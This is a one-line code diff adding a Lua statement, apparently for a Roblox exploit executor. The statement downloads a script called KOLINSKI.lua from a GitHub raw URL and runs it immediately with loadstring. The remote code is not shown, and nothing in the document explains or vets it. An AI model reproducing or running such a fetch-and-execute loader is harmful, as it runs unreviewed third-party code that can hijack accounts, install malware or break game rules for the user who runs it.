@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jfdedit3/KOLINSKI/refs/heads/main/KOLINSKI.lua"))()
